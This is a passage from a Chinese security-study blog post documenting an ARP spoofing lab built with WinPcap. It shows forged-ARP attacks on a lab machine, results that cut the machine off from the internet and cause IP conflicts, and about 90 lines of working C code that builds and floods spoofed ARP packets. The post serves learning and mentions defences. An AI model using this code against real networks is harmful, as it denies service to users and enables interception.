class="number">6</span>];			<span class="comment">//目标硬件地址</span></span><br><span class="line">	ULONG		dst_ip;						<span class="comment">//目标IP地址</span></span><br><span class="line">&#125; ARP_PKT;</span><br></pre></td></tr></table></figure></li>
+<li><p>获得本地计算机上所有的网络设备表</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获得本地计算机上所有的网络设备表*/</span></span><br><span class="line"><span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf)</span><br></pre></td></tr></table></figure></li>
+<li><p>打开网卡</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 打开网卡 */</span></span><br><span class="line"><span class="built_in">pcap_open</span>(d-&gt;name,<span class="number">65536</span>,PCAP_OPENFLAG_PROMISCUOUS,<span class="number">1000</span>,<span class="literal">NULL</span>,errbuf))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>释放设备列表</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 释放设备列表 */</span></span><br><span class="line"><span class="built_in">pcap_freealldevs</span>(alldevs)</span><br></pre></td></tr></table></figure></li>
+<li><p>发送ARP数据包</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 发送ARP包 */</span></span><br><span class="line"><span class="built_in">pcap_sendpacket</span>(handle, (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;pkt, <span class="built_in">sizeof</span>(ARP_PKT))</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ol>
+<li><p>打开靶机，利用命令行<code>arp -n</code>查看<code>ARP缓存</code>。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664387481.png" alt="1565664387481"></p>
+</li>
+<li><p>打开程序，进行ARP欺骗(伪造的MAC地址为<code>1A-1A-1A-1A-1A-1A</code>，伪造的IP地址为<code>88.88.88.88</code>，发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>)。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664404355.png" alt="1565664404355"></p>
+</li>
+<li><p>攻击结束后再次利用命令行<code>arp -n</code>查看ARP缓存，发现<strong>多了一条缓存</strong>，IP地址为<code>88.88.88.88</code>，MAC地址为<code>1A-1A-1A-1A-1A-1A</code>, 与伪造的相同，攻击成功。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664411960.png" alt="1565664411960"></p>
+</li>
+</ol>
+<h4 id="禁止上网"><a href="#禁止上网" class="headerlink" title="禁止上网"></a>禁止上网</h4><ol>
+<li><p>用靶机打开<a target="_blank" rel="noopener" href="http://www.taobao.com/">www.taobao.com</a>，并ping百度域<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>，可正常上网。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664449611.png" alt="1565664449611"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664459530.png" alt="1565664459530"></p>
+</li>
+<li><p>打开程序，进行禁止上网攻击(伪造MAC地址为<code>90-90-90-90-90-90</code>，发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>) </p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664524204.png" alt="1565664524204"></p>
+</li>
+<li><p>在攻击过程中打开<a target="_blank" rel="noopener" href="http://www.taobao.com/">www.taobao.com</a>，并ping百度域<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>,无法上网。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664536161.png" alt="1565664536161"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664544848.png" alt="1565664544848"></p>
+</li>
+<li><p>在攻击过程中使用wareshark抓包。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664561633.png" alt="1565664561633"></p>
+</li>
+<li><p>分析ARP包结构，发现源MAC地址是伪造的MAC地址，ARP包没有错误。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664628262.png" alt="1565664628262"></p>
+</li>
+</ol>
+<h4 id="IP冲突攻击"><a href="#IP冲突攻击" class="headerlink" title="IP冲突攻击"></a>IP冲突攻击</h4><ol>
+<li><p>用靶机打开<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>，并ping百度域名<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>,<br>可正常上网。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664726685.png" alt="1565664726685"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664731112.png" alt="1565664731112"></p>
+</li>
+<li><p>打开程序，进行禁止上网攻击(发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>) 。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664745324.png" alt="1565664745324"></p>
+</li>
+<li><p>在攻击过程中打开<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>，并ping百度域名<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>,<br>无法上网。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664753049.png" alt="1565664753049"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664758887.png" alt="1565664758887"></p>
+</li>
+<li><p>在攻击过程中使用wareshark抓包, 分析ARP包结构，靶机的IP地址对应的是攻击机的MAC地址，由于无法查看网关上的ARP列表，根据接收的ARP包的信息和无法上网可以判断网关ARP列表上会出现靶机IP地址对应两个MAC地址的现象，一个靶机的MAC地址，一个攻击机的MAC地址，即实现了IP冲突攻击。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664793294.png" alt="1565664793294"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664799061.png" alt="1565664799061"></p>
+</li>
+</ol>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>​        ARP欺骗的原理是由于<strong>局域网的网络传输并不是通过IP而是通过mac地址</strong>，因此模拟出一个不存的mac地址进行收发数据，这样会导致不能正常的进行网络通信。本实验是基于WinPcaP的，实验过程熟悉了WinPcaP的安装配置方法。ARP攻击其实会导致很严重的后果，那么如何防范ARP攻击，这就是需要思考的问题，目前了解的方法有清空ARP缓存和指定ARP对应关系。</p>
+<h3 id="实验核心代码"><a href="#实验核心代码" class="headerlink" title="实验核心代码"></a>实验核心代码</h3><p><a target="_blank" rel="noopener" href="https://download.csdn.net/download/weixin_41936557/11538034">点击下载程序源代码</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 选择网卡接口 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">select_adapters</span>(&amp;handle) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择攻击方式 */</span></span><br><span class="line">start_attacking:</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">select_attackmethod</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">goto</span> location_1; <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">goto</span> location_2; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:	<span class="keyword">goto</span> location_3; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">pcap_if_t</span>	*alldevs;					<span class="comment">//获取到的网络设备列表</span></span><br><span class="line"><span class="type">pcap_if_t</span>	*d;							<span class="comment">//指向的一个网络设备</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 检索设备列表 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf) == <span class="number">-1</span>)<span class="comment">//pcap_findalldevs获得本地计算机上所有的网络设备列表</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;检索设备列表错误: %s\n&quot;</span>, errbuf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打印设备列表 */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;所有网络设备如下：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d. %s&quot;</span>, ++i, d-&gt;name);</span><br><span class="line">	<span class="keyword">if</span> (d-&gt;description)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; (%s)\n&quot;</span>, d-&gt;description);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; (没有合适的描述)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n没有发现设备！\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入设备编号 (1-%d): &quot;</span>, i);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">	<span class="keyword">if</span> (num &lt; <span class="number">1</span> || num &gt; i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;接口编号不在列表范围内，请重新输入 (1-%d)：&quot;</span>, i);</span><br><span class="line">&#125; <span class="keyword">while</span> (num &lt; <span class="number">1</span> || num &gt; i);</span><br><span class="line"><span class="comment">/* 跳转到已选设备 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; d = d-&gt;next, i++);</span><br><span class="line"><span class="comment">/* 打开网卡 */</span></span><br><span class="line"><span class="keyword">if</span> ((*handle = <span class="built_in">pcap_open</span>(d-&gt;name,	<span class="comment">// 设备名</span></span><br><span class="line">	<span class="number">65536</span>,							<span class="comment">// 要捕获的数据包的哪一部分,65536保证能捕获到不同数据链路层上的每个数据包上的全部内容</span></span><br><span class="line">	PCAP_OPENFLAG_PROMISCUOUS,		<span class="comment">// 混杂模式</span></span><br><span class="line">	<span class="number">1000</span>,							<span class="comment">// 读取超时时间</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">// 远程机器验证</span></span><br><span class="line">	errbuf							<span class="comment">// 错误缓冲</span></span><br><span class="line">)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\n无法打开网卡. %s 不支持WinPcap！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">pcap_freealldevs</span>(alldevs);	<span class="comment">//释放设备列表</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 填充ARP包 */</span></span><br><span class="line">ARP_PKT		pkt;	<span class="comment">//ARP包</span></span><br><span class="line"><span class="built_in">memcpy</span>(pkt.ether_dhost, dst_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.ether_shost, forged_mac, <span class="number">6</span>);</span><br><span class="line">pkt.ether_type = ::<span class="built_in">htons</span>(<span class="number">0x0806</span>);</span><br><span class="line">pkt.hardware_type = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line">pkt.protocol_type = <span class="built_in">htons</span>(<span class="number">0x0800</span>);</span><br><span class="line">pkt.hardware_protocol_len = <span class="built_in">htons</span>(<span class="number">0x0604</span>);</span><br><span class="line">pkt.opcode = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.src_hrd_addr, forged_mac, <span class="number">6</span>);</span><br><span class="line">pkt.src_ip = <span class="built_in">inet_addr</span>(forged_ip);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.dst_hrd_addr, dst_mac, <span class="number">6</span>);</span><br><span class="line">pkt.dst_ip = <span class="built_in">inet_addr</span>(dst_ip);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 发送ARP包 */</span></span><br><span class="line"><span class="keyword">while</span> (send_num &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(handle, (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;pkt, <span class="built_in">sizeof</span>(ARP_PKT)) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;ARP包发送错误: \n&quot;</span>, <span class="built_in">pcap_geterr</span>(handle));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Sleep</span>(interval);	<span class="comment">//设定间隔时间</span></span><br><span class="line">	send_num--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C.html" title="ARP欺骗实验">https://leeyuxun.github.io/ARP欺骗实验.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/ARP%E6%AC%BA%E9%AA%97/" rel="tag"><i class="fa fa-tag"></i> ARP欺骗</a>
+              <a href="/tags/winpcap/" rel="tag"><i class="fa fa-tag"></i> winpcap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ADWORLD-WEB-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html" rel="prev" title="ADWORLD WEB 新手练习区 WP">
+      <i class="fa fa-chevron-left"></i> ADWORLD WEB 新手练习区 WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/DoS%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html" rel="next" title="DoS攻击实验">
+      DoS攻击实验 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="nav-number">1.</span> <span class="nav-text">实验内容</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9C%E7%A6%81%E6%AD%A2%E4%B8%8A%E7%BD%91%E2%80%9D%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.</span> <span class="nav-text">“禁止上网”攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9CDNS%E6%AC%BA%E9%AA%97%E2%80%9D%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.</span> <span class="nav-text">“DNS欺骗”攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90ARP%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">2.3.</span> <span class="nav-text">分析ARP攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Winpacp%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97"><span class="nav-number">2.4.</span> <span class="nav-text">Winpacp实现ARP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF"><span class="nav-number">2.4.1.</span> <span class="nav-text">设计思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83"><span class="nav-number">2.4.2.</span> <span class="nav-text">搭建编程环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">2.4.3.</span> <span class="nav-text">数据结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">2.4.4.</span> <span class="nav-text">实验结果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ARP%E6%AC%BA%E9%AA%97"><span class="nav-number">2.4.4.1.</span> <span class="nav-text">ARP欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A6%81%E6%AD%A2%E4%B8%8A%E7%BD%91"><span class="nav-number">2.4.4.2.</span> <span class="nav-text">禁止上网</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IP%E5%86%B2%E7%AA%81%E6%94%BB%E5%87%BB"><span class="nav-number">2.4.4.3.</span> <span class="nav-text">IP冲突攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-number">2.4.5.</span> <span class="nav-text">实验总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="nav-number">2.4.6.</span> <span class="nav-text">实验核心代码</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
